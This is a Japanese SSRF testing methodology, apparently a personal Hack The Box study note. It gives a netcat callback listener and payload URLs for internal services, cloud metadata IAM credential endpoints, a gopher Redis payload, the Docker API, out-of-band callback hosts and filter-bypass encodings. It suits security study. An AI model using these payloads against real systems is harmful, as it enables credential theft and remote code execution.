### **SSRF（Server-Side Request Forgery)

SSRF（サーバーサイドリクエストフォージェリ）は、攻撃者がサーバーに不正なリクエストを送信させ、内部ネットワークや非公開のAPIにアクセスさせる脆弱性
## **SSRFを疑うべきケース**

SSRFの可能性がある状況

1. **ユーザーが指定したURLに対してサーバーがリクエストを送る機能がある**
    
    - **画像のURLプレビュー**  
        → ユーザーがURLを入力すると、画像を取得して表示する
    - **Webhooksの登録**  
        → ユーザーがWebhookのURLを指定すると、サーバーがリクエストを送る
    - **APIリクエストの中継（Proxy機能）**  
        → 外部APIと連携するシステム（例: OpenGraph、RSSリーダー）
2. **外部サービスとの通信を行う機能がある**
    
    - **PDF生成機能**  
        → WebページをPDFに変換するサービス（URLを直接指定できる場合が多い）
    - **クラウド関連の操作がある** → AWSやGCP環境のメタデータにアクセスできる可能性がある
    - **URLフィルタリングが甘いAPI**  
        → 任意のURLにリクエストを送れる（API GatewayやOpen Redirectが存在）
3. **エラーメッセージにリクエスト結果が表示される**
    
    - **リダイレクトが発生する**
    - **リクエスト先のエラーメッセージがレスポンスに表示される**


## **SSRFの検証方法**

まずSSRFかもと思ったら、下を試す前に怪しまれないように確認する方法
→自分(攻撃者側)の端末にリクエストを飛ばさせる
netcatで待機
```
nc -lvnp 5555
```
`http://自分のIP:5555`にアクセスして、nc側にリクエストが飛んでくるかを確認する
リクエストが飛んできた場合
→SSRFの脆弱性がある

下に進む

### **1. 内部ネットワークアクセスを試す**

まず、内部サービスへのアクセスを確認するために、ローカルアドレスにリクエストを送る。

#### **基本的なSSRFテスト**

入力フォームやAPIエンドポイントに、以下のURLを試す。

```bash
http://127.0.0.1/
http://localhost/
http://192.168.1.1/
http://10.0.0.1/
http://[::1]/
```

→ 何らかのレスポンスがある場合、内部アクセスが可能な可能性が高い。

#### **管理パネルのチェック**

SSRFで管理パネルやアプリケーションにアクセスできるかを調査

```bash
http://localhost/admin
http://127.0.0.1:8000/
http://127.0.0.1:8080/
http://127.0.0.1:5000/
http://127.0.0.1:9001/ (Supervisor)
```

→ 404以外のレスポンスや特定の管理画面のレスポンスが返ってきたら脆弱性あり。


### **2. クラウドメタデータの取得**

クラウド環境（AWSやGCPなど）のメタデータサーバーが取得できるか試す。

#### **AWSのメタデータ**

```bash
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

→ IAMクレデンシャルが取得できる場合、EC2の特権情報を取得できる。

#### **GCPのメタデータ**

```bash
http://metadata.google.internal/computeMetadata/v1/
```

→ GCPのインスタンス情報が取得できる。

#### **Azureのメタデータ**

```bash
http://169.254.169.254/metadata/instance?api-version=2021-01-01
```


### **3. SSRF to RCE（リモートコード実行）**

一部のシステムでは、SSRFを利用してリモートコード実行（RCE）につながることがある。

#### **Redisへのアクセス**

Redisのデフォルトポート `6379` にアクセスできるかを試す

```bash
http://127.0.0.1:6379/
gopher://127.0.0.1:6379/_%2A1%0D%0A$4%0D%0Ainfo%0D%0A
```

→ Redisにアクセスできるなら、後続の攻撃が可能。

#### **Elasticsearchへのアクセス**

```bash
http://127.0.0.1:9200/_cat/indices
```

→ もしElasticsearchのデータが取得できるなら、内部情報を抜き出せる。

#### **Docker APIの利用**

Dockerが動いているかを確認：

```bash
http://127.0.0.1:2375/images/json
```

→ コンテナ作成が可能なら、RCEのチャンス。


### **4. DNS Exfiltration（データ流出の確認）**

SSRFを利用して、攻撃者が制御するサーバーにリクエストを送らせることで、外部通信が可能かを確認する。

#### **Burp Collaborator / Interactsh**

Burp CollaboratorやInteractshを使い、サーバーが外部へリクエストを送信するかを確認

```bash
http://your-burp-collaborator-id.burpcollaborator.net/
http://your-interactsh-id.interact.sh/
```

→ もしサーバーがリクエストを送信してきたら、外部通信が可能な証拠。


### **5. Bypass Techniques（フィルタ回避）**

一部のサーバーでは、SSRFを防ぐために「`localhost` へのリクエスト禁止」などの制限がある。以下の方法でバイパスを試す。

#### **IPアドレスのエンコード**

```bash
http://2130706433/  # 127.0.0.1 を整数表記
http://0x7F000001/  # 127.0.0.1 を16進数
```

#### **DNS Rebinding**

一部のサーバーでは、外部ドメインから内部へリクエストを送れるようになる。

```bash
http://attacker-controlled-domain.com/
```

→ DNSリバインディングを利用し、`localhost` へリダイレクト。

### 最終奥義 : Burpsuiteでブルートフォースで管理用ポートを探し出す
ここでは、内部向けの公開されていない空いているポートを探す
Burp SuiteのIntruderを使って、すべてのポートで試す
こんな感じで、該当部分をIntruderに送って、画像内の80の部分を「1~65535」で探す。
(*なんかFreeバージョンだと制限かかって動かなそう)
![](https://raw.githubusercontent.com/crum7/Obsidian/main/%E8%84%86%E5%BC%B1%E6%80%A7%E8%A9%B3%E7%B4%B0/images/Pasted%20image%2020250130145732.png)
![](https://raw.githubusercontent.com/crum7/Obsidian/main/%E8%84%86%E5%BC%B1%E6%80%A7%E8%A9%B3%E7%B4%B0/images/Pasted%20image%2020250130145941.png)

(なんかFreeバージョンだと制限かかって動かなそう)
pythonで同じことをする

## **まとめ**

HTBでSSRFを調査する際は、以下の流れでテストするとよい：

1. **内部ネットワークへのアクセスを試す**（`localhost`、`127.0.0.1` など）
2. **クラウドメタデータの取得を試す**（AWS、GCP、Azure）
3. **SSRFからのRCEを狙う**（Redis、Docker、Elasticsearch）
4. **DNS Exfiltrationを試す**（Burp Collaborator / Interactsh）
5. **フィルタ回避を試す**（IPエンコード、DNSリバインディング）

**内部APIやクラウド情報を抜き取ることで、次の攻撃につなげる** ケースが多いので、SSRFの発見は重要！